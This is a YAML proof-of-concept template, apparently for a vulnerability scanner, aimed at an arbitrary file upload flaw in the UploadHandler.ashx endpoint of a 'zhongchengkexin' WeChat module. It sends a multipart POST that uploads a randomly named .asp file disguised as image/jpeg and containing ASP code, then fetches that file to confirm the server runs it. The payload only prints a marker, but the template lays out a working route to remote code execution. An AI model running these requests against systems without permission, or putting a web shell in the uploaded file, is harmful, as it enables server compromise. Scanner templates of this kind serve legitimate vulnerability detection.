name: poc-yaml-zhongchengkexin-UploadHandler.ashx-File-upload
transport: http


set:
  username: randomLowercase(6)
  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
  rboundary: randomLowercase(8)

rules:
  r0:
    request:
      method: POST
      path: /WeChat/ashx/UploadHandler.ashx
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c{{rboundary}}
      body: 
       "--d0b7a0d40eed0e32904c{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"file\"; filename=\"{{username}}.asp\"\r\n\
        Content-Type: image/jpeg\r\n\
        \r\n\
        <% Response.Write(\"{{randbody}}\") %>\r\n\
        --d0b7a0d40eed0e32904c{{rboundary}}--\r\n\
        "
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /UploadImage/{{username}}.asp
    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
expression: r0() && r1()

detail:
  author: Superhero
  links:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486730&idx=1&sn=7e13caad6f8bc8f6266b5cd30fb7a04b&chksm=c267b839f510312fc4e9826ac5295ab62daef36010e0c43d2ff164643313dd2907934ed1d73c&token=522460222&lang=zh_CN#rd

